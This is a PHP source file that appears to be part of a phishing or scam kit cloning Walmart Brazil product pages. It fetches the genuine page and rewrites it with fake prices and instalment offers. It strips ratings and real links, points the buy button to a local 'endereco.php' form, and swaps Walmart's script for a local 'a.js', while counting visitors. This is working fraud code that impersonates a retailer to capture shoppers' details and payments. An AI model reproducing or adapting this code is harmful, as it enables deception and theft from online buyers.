<head>


<meta charset="utf-8" >
<link rel="shortcut icon" href="https://www.walmart.com.br/favicon.ico" type="image/x-icon">

</head>

<?php


error_reporting(0);
ini_set(“display_errors”, 0 );


	

	
 
	

if(isset($_GET['id'])){

require_once ("../Raiz/admin/function/config.php");
require_once ("../Raiz/admin/function/conexao.php");




$ID_FILTRADO = filter_var($_GET ['id'], FILTER_SANITIZE_NUMBER_INT);


$ID =  addslashes($ID_FILTRADO);



$dados4 = "SELECT* FROM produtos where id='$ID'";
$con4 = $mysqli -> query($dados4) or die ($mysqli -> error);


while ($consulta4= $con4 -> fetch_array()){
	
	$url = $consulta4 ["url"];
	$preco = $consulta4 ["preco"];
	$id_hidden = $consulta4 ["id"];
	
	
	
}



$dados5 = "SELECT* FROM contador_2 where id=1";
$con5 = $mysqli -> query($dados5) or die ($mysqli -> error);


while ($consulta5= $con5 -> fetch_array()){
	
	$visitas = $consulta5 ["visitas"];
	
	
	
}

$sql = "Update contador_2 SET visitas='$visitas'+1  where id=1" ;
$query = $mysqli->query($sql);





$dadosSite = file_get_contents($url);

$dadosSite2 = file_get_contents($url);






$var1 = explode('<span class="product-price-value"><span class="int">',$dadosSite2);

$var2 = explode('</span>',$var1[1]);

$var3 = explode('<span class="product-price-value"><span class="int">'.$var2[0].'</span><span class="dec">',$dadosSite2);

$var4 = explode('</span>',$var3[1]);


$var5 = explode('<span class="product-price-price">',$dadosSite2);

$var6 = explode('</span>',$var5[1]);

$var7 = explode('</span><span class="payment-price"><strong><span class="int">',$dadosSite2);

$var8 = explode('</span>',$var7[1]);

$var9 = explode('<span class="dec">',$dadosSite2);

$var10 = explode('</span>',$var9[1]);

$var11 = explode('condition="sem_juros">',$dadosSite2);

$var12 = explode('</span>',$var11[1]);

$var13 = explode('class="star-rating-write-review wm-lightbox">',$dadosSite2);

$var14 = explode('</a></span></div>',$var13[1]);





$preco_final = number_format($preco,2,",",".");


$parcela = $preco/10 ;




$string1 = "".$dadosSite."";
$stringCorrigida1 = str_replace('<span class="product-price-value"><span class="int">'.$var2[0].'</span><span class="dec">'.$var4[0].'</span>', '<span class="product-price-value"><span class="int">'.$preco_final.'</span>',  $string1);

$string2 = "".$stringCorrigida1."";
$stringCorrigida2 = str_replace('<button class="button-success button-pill right buy-button buy-button-product fluid"><i class="wm-icon icon-cart-button icon-buy-button"></i><span class="btn-label">Adicionar ao carrinho</span></button>', '<form action="endereco.php" method="post" ><input type="hidden" name="ID_MMS" value="'.$id_hidden.'" ><button class="button-success button-pill right buy-button buy-button-product fluid"><i class="wm-icon icon-cart-button icon-buy-button"></i><span class="btn-label">Adicionar ao carrinho</span></button></form>',  $string2);

$string3 = "".$stringCorrigida2."";
$stringCorrigida3 = str_replace('<span class="product-price-price">'.$var6[0].'</span>', '<span class="product-price-price">'.$parcela.'</span>',  $string3);


$string4 = "".$stringCorrigida3."";
$stringCorrigida4 = str_replace('</span><span class="payment-price"><strong><span class="int">'.$var8[0].'</span><span class="dec">'.$var10[0].'</span>','</span><span class="payment-price"><strong><span class="int">'.$preco.'</span>' ,  $string4);

$string5 = "".$stringCorrigida4."";
$stringCorrigida5 = str_replace('condition="sem_juros">'.$var12[0].'</span>' , 'condition="sem_juros">10x de ' ,  $string5);

$string6 = "".$stringCorrigida5."";
$stringCorrigida6 = str_replace('<span class="star-rating-option item-1 icon wm-icon icon-star-fill"></span>' , '' ,  $string6);

$string7 = "".$stringCorrigida6."";
$stringCorrigida7 = str_replace('<span class="star-rating-option item-2 icon wm-icon icon-star-fill"></span>' , '' ,  $string7);

$string8 = "".$stringCorrigida7."";
$stringCorrigida8 = str_replace('<span class="star-rating-option item-3 icon wm-icon icon-star-fill"></span>' , '' ,  $string8);

$string9 = "".$stringCorrigida8."";
$stringCorrigida9 = str_replace('<span class="star-rating-option item-4 icon wm-icon icon-star-fill"></span>' , '' ,  $string9);

$string10 = "".$stringCorrigida9."";
$stringCorrigida10 = str_replace('<span class="star-rating-option item-5 icon wm-icon icon-star-fill"></span>' , '' ,  $string10);

$string11 = "".$stringCorrigida10."";
$stringCorrigida11 = str_replace('<span class="star-rating-option item-6 icon wm-icon icon-star-fill"></span>' , '' ,  $string11);

$string12 = "".$stringCorrigida11."";
$stringCorrigida12 = str_replace('<span class="icon wm-icon icon-star-empty"></span>' , '' ,  $string12);

$string13 = "".$stringCorrigida12."";
$stringCorrigida13 = str_replace('<span class="star-rating-option item-1 icon wm-icon icon-star-fill"></span>' , '' ,  $string13);

$string14 = "".$stringCorrigida13."";
$stringCorrigida14 = str_replace('class="star-rating-write-review wm-lightbox">'.$var14[0].'</a></span></div>' , '' ,  $string14);

$string15 = "".$stringCorrigida13."";
$stringCorrigida15 = str_replace('href="' , 'onclick="return false " href="' ,  $string15);

$string16 = "".$stringCorrigida15."";
$stringCorrigida16 = str_replace('href="https://www2.walmart.com.br/checkout/content/carrinho/"' , 'href="#"' ,  $string16);

$string17 = "".$stringCorrigida16."";
$stringCorrigida17 = str_replace('<a id="topbar-signup-link" class="wm-topbar-sign-up" onclick="return false " href="">Cadastre-se</a>' , '<font color="orange" >Cadastre-se</font>' ,  $string17);

$string18 = "".$stringCorrigida17."";
$stringCorrigida18 = str_replace('<a id="topbar-login-link" class="login-link topbar-buttons button-link topbar-login-js" onclick="return false " href=""><span class="icon"></span>Entre</a>' , '<span class="icon"></span>Entre' ,  $string18);

$string19 = "".$stringCorrigida18."";
$stringCorrigida19 = str_replace('<form class="estimate-shipping-frm" data-url="#estimate-shipping-modal">' , '<form action="frame_2" method="post" target="mostra" ><input type="hidden" value="1" name="set" >' ,  $string19);

$string20 = "".$stringCorrigida19."";
$stringCorrigida20 = str_replace('<a class="buybox-consult-item buybox-consult-item-shipping" onclick="return false " href="#"><i class="wm-icon icon-truck"></i><span class="buybox-consult-item-text">Calcular frete e <br />prazo de entrega</span></a>' , '<iframe frameborder="0" name="mostra" src="frame_2.php" height="110" width="230" ></iframe>' ,  $string20);

$string21 = "".$stringCorrigida20."";
$stringCorrigida21 = str_replace('//static.wmobjects.com.br/webstore/js/global.min.js?c711589ddf71d32a58974c87768103e5' , '../Raiz/assets/a.js' ,  $string21);




echo $stringCorrigida21; 




}




?>



